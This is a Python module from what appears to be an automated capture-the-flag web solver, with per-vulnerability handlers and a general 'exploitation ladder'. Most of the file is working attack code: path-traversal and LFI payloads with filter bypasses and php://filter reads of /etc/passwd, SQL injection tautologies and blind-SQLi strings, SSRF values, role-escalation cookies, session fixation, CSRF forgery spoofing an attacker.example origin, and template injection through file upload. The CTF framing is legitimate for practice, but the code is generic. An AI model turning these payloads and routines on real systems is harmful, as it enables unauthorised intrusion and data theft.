"""Per-vuln-class handlers for the generic web solver, plus the `default` general ladder (R1).

`for_key(key, clues)` returns the built-in handlers whose vuln class the clue KEY names (never the value -- the
documented pitfall). The caller (lib.web.candidates) always also races `default` and every earlier web day's
answer(), so coverage never depends on a key being recognised. Each handler takes (base_url, clues_dict) and returns
a proof_<hex> string or None. Hardened off-peak by hctf web-harden against free earlier-day Time Trial targets.
"""
import json
import re
import secrets
import urllib.parse

from lib import websolve

SID_PARAMS = ("sid", "session_id", "session", "sessionid", "token", "PHPSESSID")

# clue KEY (regex) -> built-in handler name. The value in the clue is NEVER matched; only the key.
_KEY_MAP = [
    (r"sess|sid", "session_fixation"),
    # D22 "Uploading Expectations": {feature_route, render_route, preview_guide, upload_policy, upload_shape}
    (r"upload", "upload"),
    # D22 "Forged With Care": {current_user, feature_route, preferences_route, browser_session}
    (r"preferences|csrf|xsrf|browser_session", "csrf"),
]

# D25 D4: a clue KEY that names a class only TOGETHER with a companion key -> {(pattern, handler name): companion key
# regex}. Plugins declare it as KEY_COMPANIONS = {pattern: companion regex}. D25: Day 18's GraphQL kit {current_user,
# feature_route, note, protected_reference} matched Day 14's BOLA plugin on `protected_reference` alone (that class
# always ships `inventory_route` with it) -> its 20 s known-class race ran on a target it can never solve.
_COMPANIONS = {}

# D27 "Double Spent": a ONE-SHOT handler whose class is burned by any other probe's sequential POST (a single POST to
# feature_route spends the one credit before the race burst). A plugin declares `RUN_ALONE = True` (or a list of its
# handler names); lib.web.solve_target then races ONLY these handlers for a matching target -- never the default ladder
# or prior-day solvers beside them. The generated plugin template inherits the flag so future credit kits get it free.
_RUN_ALONE = set()


def run_alone_handlers(key, clues):
    """The for_key(...) handlers that must run ALONE (declared RUN_ALONE). The caller (lib.web.solve_target) races ONLY
    these for a matching target -- not the default ladder, prior solvers, OR the other furniture-key handlers an
    all-furniture kit also matches (a day23/24 handler's sequential POST would burn the one credit just like the ladder)."""
    return [(name, fn) for name, fn in for_key(key, clues) if name in _RUN_ALONE]


def run_alone(key, clues):
    """True when the clue keys match a handler that must run ALONE (a one-shot kit a raced probe would burn)."""
    return bool(run_alone_handlers(key, clues))


def _companion_ok(pat, name, keys):
    need = _COMPANIONS.get((pat, name))
    return need is None or any(re.search(need, k, re.I) for k in keys)


def gated_only(key, clues):
    """True when clue `key` is matched by KEY_MAP patterns ONLY through companion-gated entries whose companion key is
    absent from `clues` (lib.web.class_known then does not count it as a known concept)."""
    keys = list(clues if isinstance(clues, dict) else {})
    hits = [(pat, name) for pat, name in _KEY_MAP if re.search(pat, key or "", re.I)]
    return bool(hits) and all((pat, name) in _COMPANIONS and not _companion_ok(pat, name, keys) for pat, name in hits)


def for_key(key, clues):
    """Ordered (name, fn) built-in handlers whose class the clue keys name: the dispatch key first, then every other
    clue KEY (D22: the dispatch key was `current_user` / `preview_guide`, the class lived in a sibling key). A match on
    a kit-furniture key (websolve.COMMON_KEYS: framework, current_role, secondary_route ...) only counts when no
    concept key matched -- D23's kits were ALL furniture ({framework, current_role, feature_route[, secondary_route]}),
    so their plugins key on it, but `framework` is in every kit and must not outrank D22's csrf / upload."""
    out, furn = [], []
    keys = [key or ""] + [k for k in (clues if isinstance(clues, dict) else {}) if k != key]
    for k in keys:
        for pat, name in _KEY_MAP:
            if re.search(pat, k, re.I) and name in _HANDLERS and _companion_ok(pat, name, keys):
                dst = furn if k in websolve.COMMON_KEYS else out
                if (name, _HANDLERS[name]) not in dst:
                    dst.append((name, _HANDLERS[name]))
    return out or furn


def concept_handlers(key, clues):
    """for_key minus the furniture fallback: only handlers a CONCEPT clue key names (a key outside websolve.COMMON_KEYS
    -- framework / current_role / secondary_route ... are in every kit). What lib.web.class_known counts: D23's
    all-furniture kits made for_key match a D23/D24 plugin on EVERY such kit, so a never-seen class was "known" and
    raced the full known budget before its live answer took over. Dispatch (for_key) is unchanged."""
    out = []
    keys = [key or ""] + [k for k in (clues if isinstance(clues, dict) else {}) if k != key]
    for k in keys:
        if not k or k in websolve.COMMON_KEYS:
            continue
        for pat, name in _KEY_MAP:
            if (re.search(pat, k, re.I) and name in _HANDLERS and _companion_ok(pat, name, keys)
                    and (name, _HANDLERS[name]) not in out):
                out.append((name, _HANDLERS[name]))
    return out


def _named_routes(clues):
    j = clues if isinstance(clues, dict) else {}
    routes = [v for v in j.values() if isinstance(v, str) and re.fullmatch(r"/[\w./-]+", v)]
    for v in j.values():
        if isinstance(v, list):
            routes += [x for x in v if isinstance(x, str) and x.startswith("/")]
    return routes


def _routes(clues, base, home=None):
    """Every path the kit names in /api/clues, plus links scraped from the home page as a fallback (`home`: an already
    fetched home body). A query-bearing link counts by its path (D28: `/reader.php?doc=start.php` was dropped whole);
    the link itself, with its parameter, is _query_links' (the ladder's step 0)."""
    routes = _named_routes(clues)
    if not routes:
        if home is None:
            _, home, _ = websolve.fetch(base)
        routes = [r for r in re.findall(r'href="(/[^"#?]+)[^"#]*"', home or "")
                  if not r.startswith(("/assets", "/api/clues"))]
    return list(dict.fromkeys(routes))


_LINK_RE = re.compile(r"""(?:href|src|action)\s*=\s*["'](/[^"'#]*\?[^"'#]+)["']""", re.I)


def _query_links(html):
    """[(path, param, value)] for every same-origin link / form action on a page that carries a query string, in page
    order, one per (path, param). D28 Target 4 (the compounded Day-20 viewer, no /api/clues): its ONLY routes were
    `/reader.php?doc=<page>.php` links, which _routes dropped -- so the ladder reached `doc` after ~100 requests."""
    out, seen = [], set()
    for href in _LINK_RE.findall(html or ""):
        u = urllib.parse.urlsplit(href.replace("&amp;", "&"))
        if u.path.startswith(("/assets", "/api/clues")):
            continue
        for k, v in urllib.parse.parse_qsl(u.query, keep_blank_values=True):
            if (u.path, k) not in seen:
                seen.add((u.path, k))
                out.append((u.path or "/", k, v))
    return out


# ---- clue-less path traversal (lane-day 04 "Stay in Your Directory", compounded into D27/D28 Masteries) -------------
# File-ish parameter names a viewer / include page takes (the kit's was `doc`; generalized).
LFI_PARAMS = ("doc", "document", "file", "filename", "page", "path", "name", "view", "template", "tpl", "include",
              "inc", "load", "read", "show", "content", "lang", "dir", "folder")
# Where this event mounts the attempt proof (every LFI prompt so far named /run/huntress/objective.txt; a compounded
# Mastery target's prompt is ANOTHER challenge's and names nothing), then the classic fallbacks.
LFI_TARGETS = ("/run/huntress/objective.txt", "/flag.txt", "/flag")
# Traversal depth, deepest first: include() clamps extra `../` at `/`, so a deep one lands from any base dir (D28:
# reader.php's base /var/www/html/pages/ took >= 4, the breach target was read at 9); 1..8 cover an app that caps it.
LFI_DEPTHS = (9, 10, 5, 6, 7, 8, 4, 3, 2, 1)
_FILEISH = re.compile(r"/|\.(?:php\d?|phtml|html?|txt|md|inc|tpl|twig|ejs|hbs|j2|jinja2?|xml|json|ya?ml|cfg|conf|ini|"
                      r"log|csv)$", re.I)
_VIEWER_PAGE = re.compile(r"^/(?:[\w-]+/)*(?:read(?:er)?|notes?|view(?:er)?|docs?|document|pages?|files?|include|"
                          r"download|show|runbooks?|handbook|help)\.(?:php\d?|phtml|asp|aspx|jsp)$", re.I)


def lfi_param(param, value=""):
    """A query parameter that looks like it names a file: an LFI_PARAMS name, or a value shaped like a path/file."""
    return str(param).lower() in LFI_PARAMS or bool(_FILEISH.search(value or ""))


def lfi_fingerprint(html):
    """Clue-less LFI fingerprint of a home page -> [(path, param, value)] candidates ([] = not this class): a link whose
    query parameter names a file (`?doc=start.php`, `?file=`, `?page=`, ...), a GET form with such an input, or a viewer
    page (reader.php / notes.php ...) whose parameter we then guess. lib.web.solve_target treats a hit as a KNOWN class
    (adequate budget, the traversal probe raced first) instead of the 12 s unknown-key cap that missed D27/D28 Target 4."""
    html = html or ""
    out = [(p, k, v) for p, k, v in _query_links(html) if lfi_param(k, v)]
    for method, action, fields, _choices in _forms(html):
        path = urllib.parse.urlsplit(action or "").path
        if method == "get" and path.startswith("/"):
            out += [(path, k, v) for k, v in fields.items() if str(k).lower() in LFI_PARAMS]
    have = {p for p, _k, _v in out}
    for page in re.findall(r"""(?:href|action)\s*=\s*["'](/[^"'#?]+)""", html, re.I):
        if page not in have and _VIEWER_PAGE.search(page):
            have.add(page)
            out += [(page, k, "") for k in ("doc", "file", "page", "path")]
    return list(dict.fromkeys(out))


def traversal_values(target, value=""):
    """URL-encoded parameter values that read absolute `target` through a traversal: plain `../` at every LFI_DEPTHS
    depth first (one request on the D28 kit), then the absolute path, the link's own directory prefix + traversal, the
    filter bypasses (non-recursive strip, encoded / double-encoded slash, backslash) and a php://filter base64 read."""
    rel = target.lstrip("/")
    q = lambda s: urllib.parse.quote(s, safe="/")  # noqa: E731
    out = [q("../" * d + rel) for d in LFI_DEPTHS] + [q(target)]
    prefix = value.rsplit("/", 1)[0] + "/" if "/" in (value or "").strip("/") else ""
    if prefix:
        out += [q(prefix + "../" * d + rel) for d in LFI_DEPTHS[:2]]
    for d in (9, 5):
        out += [q("....//" * d + rel), "..%2f" * d + q(rel), "%2e%2e%2f" * d + q(rel), "..%252f" * d + q(rel),
                "..%5c" * d + q(rel)]
    out.append(q("php://filter/convert.base64-encode/resource=" + target))
    return list(dict.fromkeys(out))


def lfi_proof(body):
    """proof_<hex> in a traversal response: as-is, or inside a base64 blob (a php://filter read)."""
    p = websolve.proof(body)
    if p:
        return p
    import base64
    for b in re.findall(r"[A-Za-z0-9+/]{16,}={0,2}", body or ""):
        try:
            p = websolve.proof(base64.b64decode(b + "=" * (-len(b) % 4)).decode("utf-8", "replace"))
        except ValueError:
            continue
        if p:
            return p
    return None


def _with_param(url, param, value):
    """`url` with `param` set to the already-encoded `value` (other query params of the link kept)."""
    u = urllib.parse.urlsplit(url)
    qs = [f"{urllib.parse.quote(k)}={urllib.parse.quote(v)}" for k, v in urllib.parse.parse_qsl(u.query, True)
          if k != param]
    return urllib.parse.urlunsplit(u._replace(query="&".join(qs + [f"{urllib.parse.quote(param)}={value}"])))


def lfi(base, clues, home=None):
    """Clue-less path traversal (the Day-20 lane-day 04 viewer, D27/D28 Mastery Target 4): for every fingerprinted
    (page, file parameter) read LFI_TARGETS through traversal_values. ~1 request when the kit is the known one; <= ~25
    per (page, param) per target otherwise. `home`: the already fetched home body (lib.web.solve_target passes it)."""
    if home is None:
        _, home, _ = websolve.fetch(base)
    cands = lfi_fingerprint(home)
    for target in LFI_TARGETS:
        for path, param, value in cands:
            url = urllib.parse.urljoin(base, path)
            for v in traversal_values(target, value):
                p = lfi_proof(websolve.fetch(_with_param(url, param, v))[1])
                if p:
                    return p
    return None


def session_fixation(base, clues):
    """Session fixation (lifted from the Day-21 session-impression solver): plant the hinted session id (or our own)
    via the planting route, then present it as the cookie on every protected route until the privileged session leaks
    the proof."""
    j = clues if isinstance(clues, dict) else {}
    routes = _routes(j, base)
    hint = next((v for k, v in j.items() if isinstance(v, str) and re.search(r"sess|sid|token", k, re.I)), None) \
        or secrets.token_hex(6)
    cookies, planted = [], set()
    for r in routes:
        url = urllib.parse.urljoin(base, r)
        _, body, _ = websolve.fetch(url)
        p = websolve.proof(body)
        if p:
            return p
        if not re.search(r"session|sid", body, re.I) or re.search(r"login|authenticat", body, re.I):
            continue
        for name in SID_PARAMS:
            _, body, sc = websolve.fetch(url + "?" + urllib.parse.urlencode({name: hint}))
            p = websolve.proof(body)
            if p:
                return p
            if "required" not in body:
                cookies += [c.split(";", 1)[0] for c in sc]
                planted.add(r)
                break
    cands = [c for c in cookies if c.split("=", 1)[-1] == hint] or cookies \
        or [f"{n}={hint}" for n in ("arena_session", "PHPSESSID", "session", "sid", "laravel_session")]
    for r in sorted(routes, key=lambda r: r in planted):   # protected (non-planting) routes first
        url = urllib.parse.urljoin(base, r)
        for c in cands:
            _, body, _ = websolve.fetch(url, {"Cookie": c})
            p = websolve.proof(body)
            if p:
                return p
    return None


_PARAM_PAYLOADS = {
    "id": ["1", "0", "2", "admin"],
    "user": ["admin", "0", "1"], "user_id": ["1", "0", "2"], "uid": ["1", "0"],
    # LFI: a PHP viewer silently returns the NORMAL page for shallow traversal, so go deep (>= 3 `../`) and
    # target the absolute path the prompt names on this event -- measured /run/huntress/objective.txt. `doc`
    # is the viewer's param name on this lane's LFI family and was missing from the ladder.
    "file": ["../../../../etc/passwd", "../../../../../run/huntress/objective.txt", "../app.py", "index.html"],
    "path": ["../../../../etc/passwd", "../../../../../run/huntress/objective.txt", "../app.py"],
    "page": ["../../../../etc/passwd", "../../../../../run/huntress/objective.txt"],
    "doc": ["../../../../../run/huntress/objective.txt", "../../../../etc/passwd"],
    "url": ["http://127.0.0.1/", "http://localhost/", "file:///etc/passwd"],
    # Blind SQLi: the search interpolates `q` into an EVEN number of `col LIKE '%q%'` clauses, so the classic
    # tautology pair (`' OR '1'='1` / `'...'='2`) is NOT an oracle -- both return all rows. A QUOTE-BALANCED
    # payload (`nope' OR (<cond>) OR '1'='2`) makes every literal clause false and reduces the WHERE to <cond>,
    # surfacing the hidden proof row directly (the proof sits in a `summary`-like column).
    "q": ["' OR '1'='1", "') OR ('1'='1", "1 OR 1=1",
          "nope' OR (summary LIKE 'proof%') OR '1'='2", "nope' OR 1=1 OR '1'='2"],
    "search": ["' OR '1'='1", "nope' OR (summary LIKE 'proof%') OR '1'='2"],
    "name": ["' OR '1'='1", "nope' OR (summary LIKE 'proof%') OR '1'='2"], "q2": ["' OR '1'='1"],
}
_PRIV_ROLES = ("admin", "administrator", "moderator", "root", "superuser")


def default(base, clues):
    """R1: general exploitation ladder for an unknown / unmatched clue key, driven ONLY by the invariant kit shape
    (named routes + current_role). Never fails to TRY -- it is the no-fail path for a never-seen class.
    Ladder: (1) GET every named route as-is; (2) role escalation (present privileged role cookies/headers);
    (3) parameter tampering (IDOR / LFI / SSRF / SQLi) on the named routes. First proof_<hex> wins."""
    j = clues if isinstance(clues, dict) else {}
    home = None
    if not _named_routes(j):
        _, home, _ = websolve.fetch(base)
    routes = _routes(j, base, home)

    # 0) clue-less app: its query-bearing links, each with ITS OWN parameter's payloads first (D28 Target 4: the
    #    `doc` viewer link was the only way in, reached only after ~100 role/param probes on the bare paths)
    for path, param, value in _query_links(home):
        url = urllib.parse.urljoin(base, path)
        vals = traversal_values(LFI_TARGETS[0], value) if lfi_param(param, value) else []
        vals += [urllib.parse.quote(v, safe="/") for v in _PARAM_PAYLOADS.get(param, [])]
        for v in dict.fromkeys(vals):
            p = lfi_proof(websolve.fetch(_with_param(url, param, v))[1])
            if p:
                return p

    # 1) every named route as the current role
    for r in routes:
        p = websolve.proof(websolve.fetch(urllib.parse.urljoin(base, r))[1])
        if p:
            return p

    # 2) role escalation: common ways the kit carries a role
    for role in _PRIV_ROLES:
        for hdrs in ({"Cookie": f"role={role}"}, {"Cookie": f"current_role={role}"},
                     {"X-Role": role}, {"Cookie": f"user={role}"}):
            for r in routes:
                p = websolve.proof(websolve.fetch(urllib.parse.urljoin(base, r), hdrs)[1])
                if p:
                    return p

    # 3) parameter tampering on each named route (IDOR / LFI / SSRF / SQLi)
    for r in routes:
        url = urllib.parse.urljoin(base, r)
        for param, vals in _PARAM_PAYLOADS.items():
            for v in vals:
                q = urllib.parse.urlencode({param: v})
                p = websolve.proof(websolve.fetch(f"{url}{'&' if '?' in url else '?'}{q}")[1])
                if p:
                    return p
    return None


_XSITE = {"Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Dest": "document",
          "Sec-Fetch-User": "?1", "Referer": "https://attacker.example/forged.html"}
_ATTR = r"""\b{}\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))"""


def _attr(tag, name):
    m = re.search(_ATTR.format(name), tag, re.I)
    return next((g for g in m.groups() if g is not None), "") if m else None


class _Session:
    """Tiny cookie jar over websolve.fetch (keeps the victim's arena_session across the recon and the forged hit)."""

    def __init__(self, base):
        self.base, self.jar = base, {}

    def get(self, path, headers=None, data=None, method=None):
        h = dict(headers or {})
        if self.jar:
            h["Cookie"] = "; ".join(f"{k}={v}" for k, v in self.jar.items())
        st, body, sc = websolve.fetch(urllib.parse.urljoin(self.base, path), h, data=data, method=method)
        for c in sc:
            k, _, v = c.split(";", 1)[0].partition("=")
            if k.strip():
                self.jar.setdefault(k.strip(), v.strip())
        return st, body


def _forms(html):
    """[(method, action, fields{name: value}, choices{name: [option values]})] for every <form> in the page."""
    out = []
    for m in re.finditer(r"<form\b([^>]*)>(.*?)</form>", html, re.I | re.S):
        tag, inner = m.groups()
        fields, choices = {}, {}
        for s in re.finditer(r"<select\b([^>]*)>(.*?)</select>", inner, re.I | re.S):
            name = _attr(s.group(1), "name")
            if name:
                opts = [_attr(o, "value") for o in re.findall(r"<option\b[^>]*>", s.group(2), re.I)]
                choices[name] = [o for o in opts if o is not None]
        for i in re.findall(r"<(?:input|textarea|button)\b[^>]*>", inner, re.I):
            name = _attr(i, "name")
            if name and (_attr(i, "type") or "").lower() not in ("submit", "button", "reset"):
                fields[name] = _attr(i, "value") or ""
        out.append(((_attr(tag, "method") or "get").lower(), _attr(tag, "action") or "", fields, choices))
    return out


def _state_routes(html, clues):
    """Where the app shows the saved state: /api/* links on the form page, then /api/* values in the clues."""
    links = re.findall(r"""href\s*=\s*["'](/api/[^"'#]+)["']""", html, re.I)
    links += [v for v in clues.values() if isinstance(v, str) and v.startswith("/api/") and v != "/api/clues"]
    return list(dict.fromkeys(links))


def csrf(base, clues):
    """CSRF (lifted from the Day-22 forged-with-care solver; GM-confirmed single, TT and Mastery): the clue-named
    page holds a state-changing <form> (select of the current value + a foreign one, optional hidden csrf_token =
    session). Submitting it same-site records `changed_across_sites:false`; the SAME request sent as a cross-site
    navigation (Sec-Fetch-Site cross-site, foreign Referer/Origin) makes the state route (/api/*) return the proof.
    Tries the form with the token, without it, and with the method swapped; ~5 requests."""
    s = _Session(base)
    clues = clues if isinstance(clues, dict) else {}
    action_route = clues.get("feature_route")
    pages = [v for k, v in clues.items() if isinstance(v, str) and re.fullmatch(r"/[\w./-]*", v)
             and v != action_route and not v.startswith("/api/")]
    for page in pages + ([action_route] if action_route else []):
        st, html = s.get(page)
        p = websolve.proof(html)
        if p:
            return p
        for method, action, fields, choices in _forms(html):
            if not choices and not fields:
                continue
            action = action or page
            cur = re.search(r"(?:current|saved)[^<]*:\s*(?:<[^>]+>\s*)*([^<\s][^<]*)", html, re.I)
            cur = cur.group(1).strip() if cur else None
            # the change the victim never asked for: a non-current option, the external/foreign one first
            alts = {name: sorted(opts, key=lambda o: (o == cur, not re.search(
                r"@|extern|outside|attacker|admin|review", o, re.I))) for name, opts in choices.items()}
            n = max((len(v) for v in alts.values()), default=1)
            hidden = [k for k in fields if re.search(r"csrf|token|nonce|xsrf", k, re.I)]
            for i in range(n):
                base_form = dict(fields)
                for name, cand in alts.items():
                    base_form[name] = cand[min(i, len(cand) - 1)]
                no_tok = {k: v for k, v in base_form.items() if k not in hidden}
                for form, meth in ((base_form, method), (no_tok, method),
                                   (base_form, "post" if method == "get" else "get")):
                    if meth == "post":
                        st, body = s.get(action, dict(_XSITE, Origin="https://attacker.example"), data=form,
                                         method="POST")
                    else:
                        q = urllib.parse.urlencode(form)
                        st, body = s.get(f"{action}{'&' if '?' in action else '?'}{q}", _XSITE)
                    p = websolve.proof(body)
                    if p:
                        return p
                    if not 200 <= st < 300:
                        continue
                    for r in _state_routes(html, clues):
                        p = websolve.proof(s.get(r)[1])
                        if p:
                            return p
    return None


# (filename, content_type) ladder: the "bouncer" only polices one of the two in every variant seen so far.
_UPLOADS = [("note.html", "text/html"), ("note.html", "text/plain"), ("note.txt.html", "text/plain"),
            ("note.htm", "text/html"), ("note.html.txt", "text/html"), ("note.svg", "image/svg+xml")]


def _clue_route(cl, *pats):
    for p in pats:
        for k, v in cl.items():
            if re.search(p, k, re.I) and isinstance(v, str) and v.startswith("/"):
                return v
    return None


def _template(base, cl, read_guide=True):
    """Template expression for the objective field, spelled from the preview guide (`{{author}}` -> `{{objective}}`);
    falls back to the common engines' syntaxes. read_guide=False: defaults only (saves a round trip)."""
    field, toks = "objective", []
    guide = _clue_route(cl, r"guide|doc|help") if read_guide else None
    if guide:
        g = websolve.fetch(urllib.parse.urljoin(base, guide))[1]
        m = re.search(r"objective[^<]{0,40}<code>\s*([\w.]+)\s*</code>", g, re.I)
        field = m.group(1) if m else field
        for ex in re.findall(r"<code>([^<]*?)</code>", g):
            m = re.fullmatch(r"(.*?)\b([A-Za-z_]\w*)\b(.*)", ex.strip(), re.S)
            if m and (m.group(1) or m.group(3)):
                toks.append(m.group(1) + field + m.group(3))
    toks += ["{{" + field + "}}", "${" + field + "}", "<%= " + field + " %>", "{" + field + "}"]
    return " ".join("<p>%s</p>" % t for t in dict.fromkeys(toks))


def _upload_try(base, post, render, shape, content, ladder):
    for fn, ct in ladder:
        fields = {"filename": fn, "content": content, "content_type": ct}
        if re.search(r"json", shape, re.I) or not shape:
            st, body, _ = websolve.fetch(urllib.parse.urljoin(base, post), {"Content-Type": "application/json"},
                                         data=json.dumps(fields).encode(), method="POST")
        else:
            st, body, _ = websolve.fetch(urllib.parse.urljoin(base, post), data=fields, method="POST")
        p = websolve.proof(body)
        if p:
            return p
        try:
            j = json.loads(body)
        except ValueError:
            j = {}
        links = [v for v in (j.values() if isinstance(j, dict) else [])
                 if isinstance(v, str) and v.startswith(("/", "http"))]
        if not links and render and 200 <= st < 300:
            links = [f"{render}?{urllib.parse.urlencode({'file': fn})}"]
        for link in links:
            p = websolve.proof(websolve.fetch(urllib.parse.urljoin(base, link))[1])
            if p:
                return p
    return None


def upload(base, clues):
    """Unrestricted upload -> server-side template preview (lifted from the Day-22 uploading-expectations solver;
    GM-confirmed single, TT and Mastery): POST {filename, content, content_type} (JSON per `upload_shape`) of an HTML
    note carrying the guide's template field to feature_route, then open the preview path the server returns
    (render_route?file=<name>). The txt/text-plain policy was never enforced; the ladder covers a bouncer that is."""
    cl = clues if isinstance(clues, dict) else {}
    post = _clue_route(cl, r"feature|upload_route|submit|action")
    render = _clue_route(cl, r"render|preview_route|view|serve")
    if not post:
        return None
    shape = str(cl.get("upload_shape", ""))
    return _upload_try(base, post, render, shape, _template(base, cl, read_guide=False), _UPLOADS[:1]) \
        or _upload_try(base, post, render, shape, _template(base, cl), _UPLOADS)


_HANDLERS = {
    "session_fixation": session_fixation,
    "upload": upload,
    "csrf": csrf,
}


# D28 TT: the codify plugin landed in this directory MID-ATTEMPT, but plugins loaded once at import, so the long-lived
# process's in-process retries (orchestrator / warm daemon / miss-retry passes) never raced it. refresh() re-scans the
# directory (a listing + one stat per file, ~1 ms) and loads new / changed plugins, unloading deleted ones; lib.web calls
# it before every target race and every retry pass. HCTF_WEB_HOT_RELOAD=0 = load once at import (the old behaviour).
HOT_RELOAD = __import__("os").environ.get("HCTF_WEB_HOT_RELOAD", "1") != "0"
GENERATION = 0      # bumped on every plugin (re)load / unload: a race older than this ran without the newest plugin
_SEEN = {}          # plugin path -> (mtime_ns, size, module) at its last load attempt (a failed one too: retried on change)
_REFRESH_LOCK = __import__("threading").Lock()
_MOD_REG = {}       # module name -> [(pattern, handler name)] it registered (so a reload / delete can unregister them)
_OWNER = {}         # handler name -> module name that registered it (a reloaded plugin may replace its own handler)


def _plugin_files():
    """[(module name, path)] of every plugin file: per-day plugins first (a day's own handler keeps its place in the
    race order), then the off-peak prebuild's generic ones (D25 D5)."""
    from pathlib import Path
    here = Path(__file__).parent
    mods = [(f"{__name__}.{p.stem}", p) for p in sorted(here.glob("*.py"))]
    mods += [(f"{__name__}.prebuilt.{p.stem}", p) for p in sorted((here / "prebuilt").glob("*.py"))]
    return [(m, p) for m, p in mods if not p.name.startswith("_")]


def _unregister(modname):
    for pat, name in _MOD_REG.pop(modname, []):
        if (pat, name) in _KEY_MAP:
            _KEY_MAP.remove((pat, name))
        _COMPANIONS.pop((pat, name), None)
    for name in [n for n, m in _OWNER.items() if m == modname]:
        _OWNER.pop(name)
        _HANDLERS.pop(name, None)
        _RUN_ALONE.discard(name)


def _load_one(modname, p):
    import importlib
    import sys
    reloading = modname in _MOD_REG or modname in sys.modules
    if reloading:
        _unregister(modname)
        sys.modules.pop(modname, None)
    mod = importlib.import_module(modname)
    hs = dict(getattr(mod, "HANDLERS", None) or {})
    comp = dict(getattr(mod, "KEY_COMPANIONS", None) or {})
    ra = getattr(mod, "RUN_ALONE", False)   # True = every handler this plugin registers; or a list of names
    ra_names = set(hs) if ra is True else {n for n in (ra or []) if isinstance(n, str)}
    reg = _MOD_REG.setdefault(modname, [])
    for pat, name in list(getattr(mod, "KEY_MAP", None) or []):
        # a built-in keeps its name; the same plugin may map several clue-key patterns to one handler
        if name in hs and callable(hs[name]) and _HANDLERS.get(name, hs[name]) is hs[name]:
            re.compile(pat)
            _HANDLERS[name] = hs[name]
            _OWNER.setdefault(name, modname)
            if (pat, name) not in _KEY_MAP:
                _KEY_MAP.append((pat, name))
                reg.append((pat, name))
            if comp.get(pat):
                re.compile(comp[pat])
                _COMPANIONS[(pat, name)] = comp[pat]
            if name in ra_names:
                _RUN_ALONE.add(name)


def _load_plugins(files=None):
    """Per-class plugin modules next to this file (`lib/web/handlers/<slug>.py`), each with KEY_MAP = [(clue-key regex,
    name)] and HANDLERS = {name: fn(base, clues) -> proof or None} (optional KEY_COMPANIONS = {regex: companion-key
    regex}: that pattern only dispatches when a companion clue key is present). The web codify worker writes one IN-RUN the moment
    a new class is cracked (D22 post-mortem #8/#9): this run's Mastery -- whose 3 targets put today's class on ANY slot --
    and every later day's compounded targets pick it up at import (or at the next refresh() in a long-lived process),
    with no adoption step and no lost update between two web chains editing this file at once. A broken plugin is
    skipped, never fatal. The ratchet may fold it in here. `files`: [(module name, path)] to (re)load (default all).
    Returns how many plugins were (re)loaded."""
    import sys
    global GENERATION
    n = 0
    for modname, p in (_plugin_files() if files is None else files):
        try:
            st = p.stat()
            _SEEN[p] = (st.st_mtime_ns, st.st_size, modname)
        except OSError:
            continue
        n += 1
        try:
            _load_one(modname, p)
        except Exception as e:  # noqa: BLE001 - one bad plugin must not sink the dispatch
            print(f"web handler plugin {p.name}: {e!r}", file=sys.stderr)
    GENERATION += n
    return n


def refresh():
    """Load plugin files that appeared or changed since the last scan and unload deleted ones (HOT_RELOAD). True when
    anything changed. Cheap enough for every race: one directory listing + one stat per plugin. Never raises."""
    if not HOT_RELOAD:
        return False
    with _REFRESH_LOCK:
        return _refresh()


def _refresh():
    global GENERATION
    try:
        files = _plugin_files()
        present = {p for _m, p in files}
        gone = [p for p in _SEEN if p not in present]
        todo = []
        for modname, p in files:
            try:
                st = p.stat()
            except OSError:
                continue
            if _SEEN.get(p, ())[:2] != (st.st_mtime_ns, st.st_size):
                todo.append((modname, p))
        if not todo and not gone:
            return False
        import importlib
        import sys
        for p in gone:
            modname = _SEEN.pop(p)[2]
            _unregister(modname)
            sys.modules.pop(modname, None)
            GENERATION += 1
        importlib.invalidate_caches()   # the import system's directory cache predates a file written mid-run
        _load_plugins(todo)
        return True
    except Exception as e:  # noqa: BLE001 - a hot-reload hiccup must never sink a race
        import sys
        print(f"web handler refresh: {e!r}", file=sys.stderr)
        return False


_load_plugins()
